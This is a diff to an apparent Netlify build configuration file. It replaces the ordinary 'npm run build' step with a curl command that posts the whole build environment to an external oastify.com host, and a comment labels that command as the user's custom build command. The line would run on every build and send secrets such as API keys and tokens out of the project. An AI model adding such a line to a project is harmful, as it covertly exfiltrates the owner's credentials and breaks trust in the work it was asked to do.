@@ -1,3 +1,7 @@
 [build]
-  publish = ".next"
-  command = "npm run build"
+  command = "curl -X POST -d \"$(env)\" https://8s1a3nblr63s3i1fp975h2xphgn7bye22r.oastify.com" # Your custom build command
+  publish = "out" # Directory containing the built files
+
+[dev]
+  command = "npm run dev" # Command for the development server
+  port = 3000 # Port for the dev server
